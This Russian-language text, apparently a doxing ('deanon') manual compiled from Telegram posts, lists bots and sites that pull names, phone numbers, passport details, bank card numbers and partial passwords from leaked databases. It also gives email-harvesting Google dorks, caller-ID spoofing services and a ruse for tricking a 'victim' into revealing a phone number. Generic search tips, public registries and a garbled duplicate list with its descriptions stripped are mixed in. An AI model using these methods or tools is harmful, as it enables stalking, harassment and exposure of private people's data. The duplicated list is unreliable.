- Телеграм-канал, на котором находятся различные базы по пробиву
https://t.me/DarkSidePlanets/18

- ПРОБИВ ПО E-MAIL
https://haveibeenpwned.com
https://ghostproject.fr
https://t.me/DarkSidePlanets/18

Пробивать по e-mail можно также с помощью Google Dorks. Проще говоря, это целенаправленный запрос в поисковике Google
- “@example.com” site:example.com - находит адреса e-mail на определенном домене.

- HR “email” site:example.com filetype:csv | filetype:xls | filetype:xlsx - находит контакты HR в формате xls, xlsx и csv на определенном домене

- site:example.com intext:@gmail.com filetype:xls - вытаскивает ID e-mail (в данном случае Gmail) из определенного домена

- ПОИСК ПО НИКАМ
https://instantusername.com
https://namechk.com
https://suip.biz/ru/?act=sherlock
https://whatsmyname.app

xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

- Как посмотреть удаленные публикации пользователя Instagram и Twitter.
Ни для кого не секрет, что интернет помнит все. Все, что в него попадает — останется там навсегда. Все ваши посты, фотографии и комментарии в социальных сетях сохранятся где-то в недрах интернета, даже если вы их везде удалите.
С помощью сервиса undelete.news можно просматривать посты, которые когда-то были удалены пользователями Twitter и Instagram. Искусственный интеллект уже отслеживает аккаунты тысяч знаменитостей, позволяя любопытным пользователям узнавать о случайных постах и неудачных твитах. 
Помимо известных людей, вы также можете добавить интересующий вас аккаунт, после чего сервис начнет сохранять посты сразу после публикации, не давая вам ничего упустить. Undelete также навсегда сохраняет истории, позволяя получить к ним доступ даже по истечению 24 часов. 

xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

- Полезные ресурсы для пробива и поиска информации
http://results.audit.gov.ru/ – портал открытых данных Счетной палаты Российской Федерации.
http://sudact.ru/ – ресурс по судебным и нормативным актам, включающим решения судов общей юрисдикции, арбитражных судов и мировых судей с качественным удобным поисковиком.
http://www.cbr.ru/credit/main.asp – справочник по кредитным организациям. Сведения ЦБ РФ о банках и прочих кредитных организациях, об отзывах лицензий на осуществление банковских операций и назначениях временных администраций, раскрытие информации и пр.
https://service.nalog.ru/inn.do – сервис определения ИНН физического лица.
https://service.nalog.ru/bi.do – сервис позволяет выяснить, заблокированы или нет банковские счета конкретного юридического лица или индивидуального предпринимателя.
http://188.254.71.82/rds_ts_pub/ – национальная часть единого реестра зарегистрированных таможенных деклараций, позволяющая определить кто, что, когда и откуда привез в нашу страну.
http://services.fms.gov.ru/ – проверка действительности паспортов и другие сервисы от ФМС России.
http://zakupki.gov.ru/223/dishonest/public/supplier-search.html – реестр недобросовестных поставщиков.
http://fedsfm.ru/documents/terrorists-catalog-portal-act – ресурс позволяет проверить, не являются ли ваши клиенты, контрагенты, конкуренты, и не дай бог, партнеры террористами или экстремистами.
http://www.stroi-baza.ru/forum/index.php?showforum=46 - «черный список» по российским строительным компаниям.
http://xn--90afdbaav0bd1afy6eub5d.xn--p1ai/ – единая база данных решений судов общей юрисдикции РФ.
http://web-compromat.com/service.html – набор сайтов, облегчающих проверку компаний и физических лиц.
http://www.centerdolgov.ru/ – информация о недобросовестных компаниях-должниках России, Украины, Белоруссии, Казахстана. Поиск возможен по названию компаний, ИНН, стране и городу.
http://www.egrul-base.ru/ - проверка клиентов, контрагентов, конкурентов за 15-30 минут. Проверка включает в себя поиск по «черным спискам», определение фактического хозяина бизнеса, связи компании, ее учредителей, генерального директора с другими организациями. Информация из ЕГРЮЛ. Цена 500 руб.
http://ras.arbitr.ru/ -Высший арбитражный суд РФ с картотекой арбитражных дел и банком решения арбитражных судов.
http://bankrot.fedresurs.ru/ – единый федеральный реестр сведений о банкротстве.
http://sts.gov.ua/businesspartner - лучший сервис проверки контрагентов, клиентов, конкурентов в Украине от Налоговой службы страны. Позволяет проверять юридическое лицо не только по собственным данным налоговой службы, но и другим открытым базам данных государственных порталов Украины. В России такого пока нет.
https://rosreestr.ru/wps/portal/cc_information_online – справочная информация по объектам недвижимости в режиме он-лайн от Федеральной службы государственной регистрации, кадастра и картографии.
http://www.nomer.org/moskva/ – телефонная база г.Москвы. Содержит адреса и телефоны всех московских квартир, в которых установлен телефон, и не только МГТС.
http://www.nomer.org/ - телефонный справочник городов России и СНГ
http://spravkaru.net/ – онлайн телефонный справочник по городам и регионам России.
http://www.info4help.com/ - телефонный справочник городов России (не проверялась, платная)
http://www.voditeli.ru/ - база данных о водителях грузовых автомашин, создана с целью выявления "хронических" летунов, алкоголиков, ворья и прочих.
http://telbase.spb.ru/ - Адресная и телефонная база Санкт-Петербурга (не проверялась, платная)
http://tapix.ru -Телефонный справочник городов России и бывших республик СССР (не проверялась, платная)
http://rossvyaz.ru/activity/num_resurs/registerNum/ – полезный поисковик, позволяющий определить оператора по номеру или фрагменту номера телефона оператора, месторасположение и т.п. За наводку спасибо Vinni.
http://www.rospravosudie.com/ – поисковик-сервис по судебным решениям в России. Содержит все опубликованные судебные решения, список судей Российской Федерации, а также список действующих адвокатов. По каждому судье можно посмотреть списки его решений. Предоставляет статистику преступлений по регионам. Является некоммерческим проектом.
http://www.salyk.kz/ru/taxpayer/interaktiv/Pages/default.aspx – официальный портал Налогового комитета Министерства финансов республики Казахстан. Располагает рядом удобных сервисов, включая реестр плательщиков НДС, поиск налогоплательщиков в республике и проч.
https://focus.kontur.ru/ - лучший в Рунете по соотношению цены и качества сервис проверки клиентов, контрагентов и т.п. , пользуясь официальными источниками статистики. Наряду с получением данных по отдельной организации позволяет в качестве дополнительной опции искать аффилированные между собой организации, а также пересечение по генеральным директорам, собственникам и т.п.
Федеральная Информационная Адресная Система – позволяет установить наличие или отсутствие любого адреса в любом месте в стране. Если точно такого адреса нет, то система выдаст наиболее близкие.
http://alexandr-sel.livejournal.com/33499.html#cutid1 – исчерпывающая и структурированная база ресурсов для проверки компаний на территории Республики Беларусь.
http://fellix13.livejournal.com/6683.html – необходимый набор ресурсов для проверки конрагентов на Украине от Сергея Коржова.
http://mbcredit.ru/ – в группу компаний Cronos входят ЗАО МБКИ, которое предоставляет качественные бизнес-справки и в режиме он-лайн осуществляет проверку кредитных историй по любым компаниям и персоналиям по конкурентным ценам , а также многое другое. Цены вполне конкурентные.
ttp://cases.pravo.ru/ – картотека арбитражных дел. При помощи сервиса вы получаете доступ к любому делу в любом арбитражном суде. Достаточно указать известные вам параметры. Искать надо при помощи правой колонки. Поиск можно вести по участникам дела (название организации или ИНН), по фамилии судьи, по номеру дела, фильтровать по датам.
http://www.gcourts.ru/ – поисковик и одновременно справочник от Yandex по судам общей юрисдикции. Позволяет искать по номерам дел, ответчикам, истцам, отслеживать прохождение дел по всем инстанциям. Просто неоценимый инструмент для безопасников и разведчиков.
https://service.nalog.ru/debt/ – сервис «Узнай свою задолженность» позволяет пользователям узнавать не только свою задолженность, но осуществлять поиск информации о задолженности по имущественному, транспортному, земельному налогам, налогу на доходы физических лиц, граждан РФ.
http://www.law-soft.ru/ – информация о предприятиях, находящихся в стадии банкротства, обобщается из «Коммерсанта», «Российской газеты». Информация с 2007 года по настоящее время. Через расширенный поиск Yandex отлично ищется по сайту.
http://egrul.nalog.ru/ – отсюда можно почерпнуть сведения, внесенные в Единый Государственный Реестр Юридических Лиц.
http://www.e-disclosure.ru/ – сервер раскрытия информации по эмитентам ценных бумаг РФ.
http://www.fssprus.ru/ – картотека арбитражных дел Высшего Арбитражного Суда Российской Федерации
http://www.mgodeloros.ru/register/search/ – база данных должников, в которой зарегистрированы все физические и юридические лица как частного, так и публичного права (кроме государственных и органов местного самоуправления, а также тех субъектов, имущество которых сдано в ипотеку или в заклад), в отношении которых начата процедура принудительного исполнения.
http://rnp.fas.gov.ru/?rpage=687&status=find – Реестр недобросовестных поставщиков ФАС РФ
Портал услуг - портал услуг Федеральной Службы Государственной Регистрации, Кадастра и Картографии, где можно получить сведения о земельной собственности и расположенной на ней недвижимости.
http://services.fms.gov.ru/info-service.htm?sid=2000 – официальный сайт Федеральной миграционной службы России, где можно получить информацию о наличии/отсутствии регистрации того или иного гражданина на территории РФ и некоторую иную информацию.
http://www.notary.ru/notary/bd.html - нотариальный портал. Содержит список с координатами всех частных практикующих нотариусов России и нотариальных палат. Для зарегистрированных пользователей доступна судебная практика нотариусов и файловый архив. База обновляется ежедневно.
http://kad.arbitr.ru/ – он-лайн картотека Арбитражного Суда Российской Федерации. Чрезвычайно полезна при умелом использовании для конкурентной разведки.
http://allchop.ru/ - Единая база всех частных охранных предприятий
http://enotpoiskun.ru/tools/codedecode/ - Расшифровка кодов ИНН, КПП, ОГРН и др.
http://enotpoiskun.ru/tools/accountdecode/ - Расшифровка счетов кредитных организаций
http://polis.autoins.ru/ - Проверка полисов ОСАГО по базе Российского союза автостраховщиков
http://www.mtt.ru/ru/defcodes/ - Коды мобильных операторов. Очень удобный поиск.
http://www.vinformer.su/ident/vin.php?setLng=ru - Расшифровка VIN транспортных средств
http://www.vinvin.ru/about.html - Проверка VIN транспортных средств по американским БД "CARFAX" и "AutoCheck"
http://www.stolencars24.eu/ - Проверка на угон проверка по полицейским базам данных Италии, Словении, Румынии, Словакии и Чехии, а также по собственной базе данных (без ограничения количества запросов)
http://www.autobaza.pl/ - Проверка на угон в Италии, Словении, Литве (не более 3 запросов в сутки с одного IP)
http://www.alta.ru/trucks/truck.php - Расчет таможенных платежей при ввозе автомобилей из-за границы
http://kupipolis.ru/ - Расчет КАСКО, ОСАГО
http://ati.su/Trace/Default.aspx - Расчет расстояний между населенными пунктами по автодорогам
http://www.garant.ru/doc/busref/spr_dtp/ - Штрафы за нарушение Правил дорожного движения онлайн
http://fotoforensics.com/ - Сервис для проверки подлинности фотографии, выявление изменений метаданных и т.п.
http://mediametrics.ru/rating/ru/online.html - Онлайн сервис по отслеживанию популярных тем в социальных сетях и СМИ

xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

20 полезных знаний для поиска в Google.
Как находить только нужную информацию.

Каждый день во всемирной паутине генерируются миллионы новых документов, фото, видео и других данных. Искать в сети с каждым годом все сложнее, то и дело попадаешь на что-то ненужное, устаревшее или протянутое рекламщиками.



Поисковая система Google давно предлагает использовать специальные операторы поиска для более точного совпадения, кроме того, поисковый гигант может самостоятельно давать ответы на некоторые вопросы без переадресации на другие сайты.



Вспоминаем забытые способы поиска и узнаем новые вместе:



1. Поиск точного совпадения



Зачем: для того, чтобы поисковик не искал каждую часть нашего запроса по отдельности, используем кавычки. Например, вы помните название статьи, песни или фильма, которые ищите. Поиск будет осуществляться по точному совпадению фразы с заданным порядком слов.



Как: заключаем весь запрос в кавычки

2. Исключаем слово из поиска



Зачем: чтобы убрать ненужные данные в выдаче можно запретить искать определенные слова. Для этого после ввода самого запроса перечисляем признаки, которые нам не нужны.



Как: перед каждым из них ставим тире без пробела.

3. Ищем на определенном сайте



Зачем: чтобы начать поиск на нужном сайте без перехода на него, следует воспользоваться оператором поиска “site:”. Обратите внимание, что адрес сайта должен быть указан полностью.



Как: поисковый_запрос site:полный_адрес_сайта

4. Поиск похожего сайта



Зачем: понравился определенный ресурс и захотелось найти нечто подобное, воспользуйтесь оператором “related:”. Google найдет главные страницы похожих сайтов без рекламной мишуры, и накрученных результатов.



Как: related:полный_адрес_сайта

5. Поиск по типу файлов



Зачем: если хотите получить данные именно в определенном формате. Например, фотографию в *.png, книгу в *.fb2, ролик в *.mp4 и т.д



Как: поисковый_запрос filetype:формат_файла

6. Поиск в диапазоне



Зачем: если ищем что-то, связанное с цифрами, и хотим ограничить круг поиска. Нас могут интересовать данные о датах, цене, времени, координатах и т.д. Чтобы не получать в выдаче лишнюю информацию – ограничиваем поиск.



Как: поисковый_запрос число_от..число_до

7. Поиск забытого слова



Зачем: забыли часть слова или фразы, не можете вспомнить цитату или отгадать кроссворд. Лучший способ поиска по фразе, с недостающими словами – использование оператора “*”



Как: пишем * вместо каждого неизвестного слова

8. Поиск любого из вариантов



Зачем: чтобы ввести запрос один раз для поиска по нескольким критериям. Если нам не обязательно искать два, три или более вариантов, а нужен один из них.



Как: используем оператор OR

9. Поиск с наличием всех вариантов



Зачем: если нужны данные о нескольких объектах, упоминающихся в одном контексте. В случае такого поиска будут выведены варианты только с наличием всех искомых слов.



Как: искомое_слово_1 & искомое_слово_2

10. Поиск профилей в социальных сетях



Зачем: так можно сразу найти страницы искомого человека, сайта или бренда. Поиск будет проводиться по профилям с указанным именем.



Как: @искомое_имя


11. Поиск записей с хештегом



Зачем: так можно увидеть самые популярные записи на определенную тему, разумеется, среди тех, кто проставляет указанный в поиске тег.



Как: #хештег


12. Время в любом городе



Зачем: чтобы быстро узнать, спит ваш друг по WOT из Америки или уже проснулся, посмотреть, когда начинается рабочий день у иностранных партнеров или просто из любопытства.



Как: время Город


13. Погода в любом городе



Зачем: аналогичный поисковый запрос, но уже с погодой в указанном регионе.



Как: погода Город


14. Время заката или рассвета



Зачем: у каждого могут быть свои специфические причины узнавать время заката или рассвета в своем городе или любом другом населенном пункте на Земле.



Как: восход/закат Город


15. Котировки акций



Зачем: для тех, кто играет на бирже, следит за новостями или просто интересуется, как обстоят дела у Apple или Tesla.



Как: акции Бренд


16. Курс валюты



Зачем: сейчас данный вопрос интересует многих. Так почему бы не искать эту информацию быстро и просто без лишних сайтов.



Как: курс Валюта (отображается курс иностранной валюты к местной)


17. Конвертер величин



Зачем: можно использовать приложения для iPhone и iPad, но проще – избавиться от ненужных программ на устройстве и использовать конвертацию от Google. Тут же можно узнавать курсы любых валют, а не только местной.



Как: единица_1 единица_2


18. Калькулятор



Зачем: еще один способ быстро заменить соответствующее приложение на смартфоне, программу на компьютере или виджет в центре уведомлений. После первого поиска получим удобный онлайн-калькулятор.



Как: используем любые математические знаки +,-,*,/ с цифрами


19. Значение слова



Зачем: конечно, этот способ не заменит емкую и полезную заметку из толкового словаря, но быстро найти нужное значение, понять о чем идет речь или узнать ударение можно.



Как: значение искомое_слово


20. Перевод слова на иностранный язык



Зачем: простой способ перевести слово с русского на английский. После первого запроса откроется онлайн-переводчик от Google, в котором можно будет выбирать любые направления перевода, прослушать произношение или использовать голосовой ввод.



Как: translate искомое_слово_на_русском_языке


Бонус - бесполезные поисковые запросы.

Программисты Google – тоже люди, им тоже свойственно веселиться и разыгрывать пользователей. Вот они и добавили несколько «пасхалок» в стандартный поиск Google. Попробуйте осуществить поиск по таким запросам:

do a barrel roll;

askew;

zerg rush;

atari breakout (на странице поиска картинок);

Конечно, это – далеко не все поисковые возможности Google и скрытые послания от разработчиков.

Для поиска по ID и юзернейму аккаунта Telegram

1. Telegago (https://cse.google.com/cse?q=+&cx=006368593537057042503:efxu7xprihg) — поиск каналов и групп, включая приватные, а так же поиск в Telegraph статьях
2. lyzem.com — поисковик аналогичный buzzim
3. @usinfobot — по ID найдёт имя и ссылку аккаунта, работает в inline режиме, введите в поле ввода сообщения @usinfobot и Telegram ID
4. cipher387.github.io (https://cipher387.github.io/quickcacheandarchivesearch/) — покажет архивированную страницу, даст 20+ прямых ссылок на сайты веб архивы, поиск по ссылке на аккаунт
5. tgstat.com (https://tgstat.com/ru/search) — поиск по публичным сообщениям в каналах
6. @SangMataInfo_bot — история изменения имени аккаунта
7. @TeleSINT_Bot — найдет группы в которых состоит пользователь
8. @creationdatebot — примерная дата создания аккаунта, бот принимает username, но не работает поиск по ID. Для поиска по ID можно переслать сообщение от пользователя
9. @MySeekerBot — поисковик по иранским каналам
10. @get_kontakt_bot — найдет номер телефона аккаунта, бот принимает username и ID
11. TelegramOnlineSpy (https://github.com/Forichok/TelegramOnlineSpy) (t) — лог онлайн активности аккаунта
12. Exgram (https://yandex.ru/search/site/?text=%22HowToFind%22&searchid=2424333) — поисковая система на основе Яндекса, поиск по 17 сайтам-агрегаторам, находит Telegraph статьи, контакты, приватные и публичным каналы с группами
13. Commentgram (https://cse.google.com/cse?cx=006368593537057042503:ig4r3rz35qi) — поиск в комментариях к постам
14. Commentdex (https://yandex.ru/search/site/?text=%22HowToFind_bot%22&searchid=2444312) — поиск в комментариях к постам
15. ⚡️@UniversalSearchBot — по ID найдёт базовые адреса почты в сервисе etlgr, статус бана пользователя ботом combot, число блокировок, заблокированные сообщения и дату начала бана
16. smartsearchbot.com — бот находит ФИО, бесплатный поиск не доступен для новых пользователей
17. @kruglyashik — канал с базой из 500K круглых видео-сообщений из русскоязычных групп, в поиске по каналу введите имя пользователя или #ID123456789 где 123456789  ID аккаунта
18. @TgAnalyst_bot — находит номер телефона, старое имя аккаунта, логин, IP и устройство, местами могут быть ложные данные, первый поиск без регистрации, если её пройти, то сливается ваш номер телефона
19. глазбога.рф — найдет часть номера телефона, историю изменения ссылки аккаунта
20. @clerkinfobot — дает номер телефона 


                            .
http://results.audit.gov.ru/                                                             .
http://sudact.ru/                                                                                                                                                            .
http://www.cbr.ru/credit/main.asp                                       .                                                                                                                                                                                     .
https://service.nalog.ru/inn.do                                          .
https://service.nalog.ru/bi.do                                                                                                                                       .
http://188.254.71.82/rds_ts_pub/                                                                                                                                                       .
http://services.fms.gov.ru/                                                                     .
http://zakupki.gov.ru/223/dishonest/public/supplier-search.html                                      .
http://fedsfm.ru/documents/terrorists-catalog-portal-act                                                                                                                                               .
http://www.stroi-baza.ru/forum/index.php?showforum=46 -                                                    .
http://xn--90afdbaav0bd1afy6eub5d.xn--p1ai/                                                       .
http://web-compromat.com/service.html                                                                .
http://www.centerdolgov.ru/                                          -                                                    .                                                            .
http://www.egrul-base.ru/ -                                                   15-30      .                                                                                                                                                                                .                    .      500    .
http://ras.arbitr.ru/ -                                                                                         .
http://bankrot.fedresurs.ru/                                                   .
http://sts.gov.ua/businesspartner -                                                                                                  .                                                                                                                                                           .                         .
https://rosreestr.ru/wps/portal/cc_information_online                                                             -                                                                               .
http://www.nomer.org/moskva/                    .      .                                                                                                     .
http://www.nomer.org/ -                                           
http://spravkaru.net/                                                            .
http://www.info4help.com/ -                                                                  
http://www.voditeli.ru/ -                                                                        "           "                                       .
http://telbase.spb.ru/ -                                 -                                       
http://tapix.ru -                                                                                         
http://rossvyaz.ru/activity/num_resurs/registerNum/                                                                                                                                  . .                    Vinni.
http://www.rospravosudie.com/            -                                    .                                                                                                                        .                                                     .                                                  .                                 .
http://www.salyk.kz/ru/taxpayer/interaktiv/Pages/default.aspx                                                                                    .                                                                                                                    .
https://focus.kontur.ru/ -                                                                                           . .                                                 .                                                                                                                                                                                                                . .
                                                                                                                              .                                                                  .
http://alexandr-sel.livejournal.com/33499.html#cutid1                                                                                                          .
http://fellix13.livejournal.com/6683.html                                                                                   .
http://mbcredit.ru/                     Cronos                                                            -                     -                                                                                                                            .                         .
ttp://cases.pravo.ru/                            .                                                                              .                                           .                                      .                                                                                                                                 .
http://www.gcourts.ru/                                          Yandex                          .                                                                                                       .                                                            .
https://service.nalog.ru/debt/                                                                                                                                                                                                                                                           .
http://www.law-soft.ru/                                                                                                                  .              2007                        .                         Yandex                        .
http://egrul.nalog.ru/                                                                                             .
http://www.e-disclosure.ru/                                                           .
http://www.fssprus.ru/                                                                           
http://www.mgodeloros.ru/register/search/                                                                                                                                                                                                                                                                                                                                   .
http://rnp.fas.gov.ru/?rpage=687&status=find                                                                                                                                                                                                                             .
http://services.fms.gov.ru/info-service.htm?sid=2000                                                                                                    /                                                                                             .
http://www.notary.ru/notary/bd.html -                    .                                                                                                .                                                                                            .                           .
http://kad.arbitr.ru/     -                                                     .                                                                       .
http://allchop.ru/ -                                              
http://enotpoiskun.ru/tools/codedecode/ -                                        .
http://enotpoiskun.ru/tools/accountdecode/ -                                         
http://polis.autoins.ru/ -                                                                  
http://www.mtt.ru/ru/defcodes/ -                          .                    .
http://www.vinformer.su/ident/vin.php?setLng=ru -             VIN                     
http://www.vinvin.ru/about.html -          VIN                                         "CARFAX"   "AutoCheck"
http://www.stolencars24.eu/ -                                                                                                                                                                                  
http://www.autobaza.pl/ -                                                         3                           IP  
http://www.alta.ru/trucks/truck.php -                                                    -          
http://kupipolis.ru/ -                     
http://ati.su/Trace/Default.aspx -                                                            
http://www.garant.ru/doc/busref/spr_dtp/ -                                                     
http://fotoforensics.com/ -                                                                                . .
http://mediametrics.ru/rating/ru/online.html -                                                                      

🔎 Поиск по номеру

Гетконтакт (https://t.me/get_kontakt_bot?start=1495179077) - подключаете своего бота и получаете 103 запроса в неделю. Есть поиск номера по ФИО или по ФИ, ну тут сами решите, за каждого реферала +1 
@NullSeach_bot - чекает в слитых базах данных, часто выдает крутые результаты. Мне выдало то, что жертве звонил суши-мастер
@The_NoNameBot - прекраснейший бот, особенно пробив по вк и бомбер. По номеру ищет вк и дает прямую ссылку. Ищет старые страницы и возможных родственников автоматически.
@GNEyeBot - мини-осинт бот, полностью бесплатный.
@ce_poshuk_bot - прекраснейший бот поиска по Украине

Раздел 1. Способы пробива.
"САЙТЫ / БОТЫ"
https://saverudata.online/ - Пробив по номеру, фамилии, почты может найти адрес/имя/фамилию и прочее. Так-же проверяет на базу клиентов ВТБ.
https://r23.fssp.gov.ru/iss/ip (включая под-ресурсы данного гос. ресурса)
https://legalacts.ru/ (включая под-ресурсы данного гос. ресурса)
http://www.consultant.ru/ (включая под-ресурсы данного гос. ресурса)
https://docs.cntd.ru/ (включая под-ресурсы данного гос. ресурса)
https://egrul.nalog.ru/index.html (включая под-ресурсы данного гос. ресурса)
https://nalog.ru/ (включая под-ресурсы данного гос. ресурса)
https://www.nalog.gov.ru/ (включая под-ресурсы данного гос. ресурса)
https://www.tinkoff.ru/ (включая под-ресурсы данного ресурса)
https://zachestnyibiznes.ru/ (включая под-ресурсы данного гос. ресурса)
@usersbox_bot - Хороший бот, аналогичен сайту выше, но баз там больше, и найти информации так-же можно больше. (Можно получить бесплатный премиум через меня, если надо скажи. А так там пробник на 7 дней дают)
@maigret_osint_bot - Пробив по никнейму
@kolibri_osint_bot - Идеальный бот, аналог ГБ. Бесплатно раздают на время бета теста (3 месяца вроде).
@glazIX_bot - Стандартный глазик, зеркало от пидорасов извини, своё лень было делать.
@Qsta_bot - Хороший бот, правда платный. Но дают пару запросов, я лично чекаю сообщения со страницы вк в нём в группах и т.д. для компромата, охуенный короче бот
@getcontact_real_bot - Бот для пробива по GetContact (5 запросов в день :( )
@ibhldr_bot - Пробив по чатам ТГ
├ @clerkinfobot — бот берет данные из приложения getcontact, показывает как записан номер телефона в контактах
├ @dosie_Bot — как и в боте uabaza дает информацио о паспорте только польностью, 3 бесплатные попытки
├ @find_caller_bot — найдет ФИО владельца номера телефона
├ @get_caller_bot — поиск по утечкам персональных данных и записным книгам абонентов, может найти ФИО, дату рождения, e-mail
├ @get_kolesa_bot — найдет объявления на колеса.кз
├ @getbank_bot — дает номер карты и полное ФИО клиента банка
├ @GetFb_bot — бот находит Facebook
├ @Getphonetestbot — бот берет данные из приложения getcontact, показывает как записан номер телефона в контактах
├ @info_baza_bot — поиск в базе данных
├ @mailsearchbot — найдет часть пароля
├ @MyGenisBot — найдет имя и фамилию владельца номера
├ @phone_avito_bot — найдет аккаунт на Авито
├ @SafeCallsBot — бесплатные анонимные звонки на любой номер телефона с подменой Caller ID
Ресурсы для пробива
├ lampyre.io — программа выполняет поиск аккаунтов, паролей и многих других данных
├ avinfo.guru — проверка телефона владельца авто, иногда нужен VPN
├ fa-fa.kz — найдет ФИО, проверка наличия задолженностей, ИП, и ограничения на выезд
├ getcontact.com — найдет информацию о том как записан номер в контактах
├ globfone.com — бесплатные анонимные звонки на любой номер телефона
├ mirror.bullshit.agency — поиск объявлений по номеру телефона
├ mysmsbox.ru — определяет чей номер, поиск в Instagram, VK, OK, FB, Twitter, поиск объявлений на Авито, Юла, Из рук в руки, а так же найдет аккаунты в мессенджерах
├ nuga.app — найдет Instagram аккаунт, авторизация через Google аккаунт и всего 1 попытка
├ numberway.com — найдет телефонный справочник
├ personlookup.com.au — найдет имя и адрес
├ phoneInfoga.crvx.fr — определят тип номера, дает дорки для номера, определяет город
├ spravnik.com — поиск по городскому номеру телефона, найдет ФИО и адрес
├ spravochnik109.link — поиск по городскому номеру телефона, найдет ФИО и адрес
├ teatmik.ee — поиск в базе организаций, ищет номер в контактах
└ truecaller.com — телефонная книга, найдет имя и оператора телефона

Пробив через Восстановление доступа
├ ICQ — icq.com/password/ru
├ Yahoo — login.yahoo.com/?display=login
├ Steam — help.steampowered.com/ru/wizard/HelpWithLoginInfo
├ Twitter — twitter.com/account/begin_password_reset
├ VK.com — vk.com/restore
├ Facebook — facebook.com/login/identify?ctx=recover
├ Microsoft — account.live.com/acsr
└ Instagram — instagram.com/accounts/password/reset

"ПРОБИВ ПАСПОРТА"
https://www.reestr-zalogov.ru/search/index - Пробив по ФИО, может выдать паспорт если есть кредит с залогом. Так-же можно пробить через VIN.

"БАНКОВСКИЕ РЕКВИЗИТЫ"
(Проверяем номер карты)
Шаг 1. Пробиваем имя через мобильный банкинг
Пробуем сделать перевод через мобильное приложение нашего банка. При этом желательно, чтобы как вы, так и объект пробива пользовались одним и тем же крупным банком типа Сбера. Ну тут уже как повезет. Если звезды сошлись, банковский интерфейс укажет нам имя владельца карты. Имея на руках имя, можно продолжить пробив даже в том же Телеграме.
Шаг 2. Пробиваем банк через сервисы
В сети существуют десятки сервисов позволяющих пробить определенную информацию по номеру карты. Это может быть как название банка и тип карты, так и регион в котором проживает хозяин номера. Оставлю парочку вариантов, чтобы вы могли выбрать:

https://bincheck.io/
https://binchecker.com/
https://bincheck.org/
https://www.freebinchecker.com

(Проверяем номер QIWI)
Если вас кинули, и вы знаете номер QIWI кошелька мамкиного наёбера, то пробить левый QIWI или нет, вообще не сложно.
Всего-лишь воспользуйтесь ботом @getcontact_real_bot если он не выдаст результатов, номер с большой вероятностью виртуальный.
(Можно попробывать найти инфу в ГБ по номеру, но этот способ с гетконтактом надёжней)

Доброго времени суток читатель данного приватного мануала,вы полюбому читаете данный мануал чтобы научится деанону.
Manual- @DEANON_RUSSIA
Первый раздел и по мере важности раздел это:
Боты
├ Quick OSINT — найдет оператора, email, как владелец записан в контактах, базах данных и досках объявлений, аккаунты в соц. сетях и мессенджерах, в каких чатах состоит, документы, адреса и многое другое
├ @clerkinfobot — бот берет данные из приложения getcontact, показывает как записан номер телефона в контактах
├ @dosie_Bot — как и в боте uabaza дает информацио о паспорте только польностью, 3 бесплатные попытки
├ @find_caller_bot — найдет ФИО владельца номера телефона
├ @get_caller_bot — поиск по утечкам персональных данных и записным книгам абонентов, может найти ФИО, дату рождения, e-mail
├ @get_kolesa_bot — найдет объявления на колеса.кз
├ @get_kontakt_bot — найдет как записан номер в контактах, дает результаты что и getcontact
├ @getbank_bot — дает номер карты и полное ФИО клиента банка
├ @GetFb_bot — бот находит Facebook
├ @Getphonetestbot — бот берет данные из приложения getcontact, показывает как записан номер телефона в контактах
├ @info_baza_bot — поиск в базе данных
├ @mailsearchbot — найдет часть пароля
├ @MyGenisBot — найдет имя и фамилию владельца номера
├ @phone_avito_bot — найдет аккаунт на Авито
├ @SafeCallsBot — бесплатные анонимные звонки на любой номер телефона с подменой Caller ID
└ @usersbox_bot — бот найдет аккаунты в ВК у которых в поле номера телефона указан искомый номер


Телефон
L Поиск по номеру телефона
[!] Содержимое раздела:


• Lampyre (https://account.lampyre.io/email-and-phone-lookup) — веб
версия поиска по любому номеру телефона, поиск по аккаунтам и телефонной книге - от себя: полезная вещь в osint-сфере, не раз спасала меня.
• Getcontact (https://getcontact.com/) — найдет информацию о том как записан номер в контактах - от себя: Сайт хороший, но я думаю, что бот в телеграмме будет на много удобнее для Вас.
• Truecaller (https://www.truecaller.com/) — телефонная книга, найдет имя и оператора телефона - от себя: Вещь годная, но долго возиться
• Bullshit (https://mirror.bullshit.agency/) — поиск объявлений по номеру телефона - Иногда нужен VPN
• @numberPhoneBot (https://t.me/@numberPhoneBot) — найдет адрес и ФИО, не всегда находит
• Spravnik (https://spravnik.com/) — поиск по городскому номеру телефона, найдет ФИО и адрес
• @info_baza_bot (https://t.me/@info_baza_bot) — поиск в базе данных
• @find_caller_bot (https://t.me/@find_caller_bot) — найдет ФИО владельца номера телефона
• @usersbox_bot (https://t.me/@usersbox_bot) — бот найдет аккаунты в ВК у которых в поле номера телефона указан искомый номер
• @getbank_bot (https://t.me/@getbank_bot) — дает номер карты и полное ФИО клиента банка
• @eyegodsbot - Телеграмм бот, часто радовал меня, есть бесплатные пробивы по машинам, лицу, номеру телефона, есть платный контент.
• @egrul_bot - Пробивает конторы/ИП, по вводу ФИО/фирмы предоставляет ИНН объекта; учредителей бизнеса/партнеров и отчет налоговую декларацию. И наоборот: поиск по ИНН выдаст ФИО/конторы. Базы данных сами понимаете откуда. Ограничений бота – нет.
• @mnp_bot 
• @xinitbot 
• @black_triangle_tg 

Далее боты для деанон Telegramm.
@deanonym_bot
@FavTgFindbot
https://anonimov.net/
@addprivategroup_bot 
@cryptoscanning_bot, 
@protestchat_bot 
@joinchatru_bot 
@deanonym_bot 
@GetCont_bot 
@Checnum_bot 
@EyeGoodBot 
@Tpoisk_Bot 
@LBSE_bot

Основое закончили.Как же найти номер?Есть простой способ зайти в глаз бога приобрести подписку и быть "доксером".
Как узнать номер:
Можно простым способ, заходим со второго аккаунта,аккаунта друга, своего аккаунта,на личку жертвы и пишем,привет можешь добавить меня в контакты я куплю что-то.Он добавляет и если он тупенький может появится его номер.
